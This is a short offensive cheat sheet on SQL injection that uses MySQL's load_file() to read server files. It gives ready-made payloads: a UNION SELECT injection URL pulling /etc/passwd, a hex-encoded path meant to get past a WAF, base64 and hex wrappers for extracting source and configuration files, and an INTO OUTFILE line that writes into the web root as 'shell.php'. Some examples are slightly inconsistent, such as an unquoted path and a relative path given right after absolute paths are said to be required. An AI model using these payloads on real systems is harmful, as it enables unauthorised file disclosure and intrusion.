# SQL Injection: LFI (Local File Inclusion) via load_file() function

If the database user has read permission (which most of the time it does), it is possible for an attacker to read the internal file of the server, with a small caviat that the absolute path must be known (just as a normal LFI).
In order to perform this kind of attack, the following function must be used:  

```sql
load_file(/path/to/file)
```

For example, the most basic approach is to read /etc/passwd:  
```sql
load_file('../etc/passwd')
```

A simple usage of the query:  
```
http://domain.com/index.php?id=1' Union Select 1,2,3,load_file('/etc/passwd'),5,6,7,8,9,10,11,12-- -
```

Alternatively you can convert **/etc/passwd** in 0xHex Format (in case WAF blocks it, or the backslashes might break up the syntax:  
```sql
load_file(0x2e2e2f6574632f706173737764)
```
Just like normal LFI, it is possible to convert the content of the file in base64, thanks to **TO_base64()** function:  
```sql
TO_base64(LOAD_FILE('/var/www/html/index.php'))  
```

You can also use **hex()** function in configuration files especially, when some characters are non-readable and might break the execution of the query:  
```sql
hex(load_file('/etc/passwd'))
```

It is possible to read the content of the file and copy it somewhere else where it's accessible to read:  
```
load_file('/etc/passwd') INTO OUTFILE '/var/www/html/shell.php'--
```
